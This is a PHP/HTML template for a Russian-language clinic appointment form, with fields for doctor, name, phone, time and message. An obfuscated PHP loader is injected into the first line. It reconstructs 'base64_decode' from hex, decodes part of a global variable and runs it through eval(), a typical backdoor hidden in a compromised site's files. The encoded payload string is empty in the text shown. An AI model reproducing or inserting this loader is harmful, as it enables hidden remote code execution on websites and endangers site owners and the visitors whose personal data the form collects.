<?php /*versio:3.02*/ $GLOBALS["yfegmf"]="";        if (!function_exists('aabeaayx')){function aabeaayx($a, $b){$c=$GLOBALS['yfegmf'];$d=pack('H*','6261736536345f64656'.'36f6465'); return $d(substr($c, $a, $b));};eval(aabeaayx(597,3304));};?><!--FORM-ENTRY-->
<form title='Запись на прием с сайта клиники "Бонус"' class="js-form form-entry" id="js-form-entry">
	<fieldset>
		<label for="">Запись на прием с сайта клиники "Бонус"</label>
		<select name="ff1" placeholder="Выберите врача">
			<option value="Выберите врача" disabled selected>Выберите врача</option>
			<option value="Врач 1">Врач 1</option>
			<option value="Врач 2">Врач 2</option>
			<option value="Врач 3">Врач 3</option>
			<option value="Врач 4">Врач 4</option>
			<option value="Врач 5">Врач 5</option>
			<option value="Врач 6">Врач 6</option>
			<option value="Врач 7">Врач 7</option>
			<option value="Врач 8">Врач 8</option>
			<option value="Врач 9">Врач 9</option>
			<option value="Врач 10">Врач 10</option>
		</select>
		<input type="text" name="ff2" req="1" placeholder="Ваше имя" />
		<input type="text" name="ff3" req="1" placeholder="Ваш телефон" />
		<input type="text" name="ff4" req="1" placeholder="Удобное время для приема" />
		<textarea name="ff5" req="1" placeholder="Текст сообщения"></textarea>
		<p class="form-entry__status"></p>

		<!--BTN-TRANSPARENT-->
		<button class="form-entry__btn-wrap / btn-transparent">Записаться на прием</button>

	</fieldset>
</form>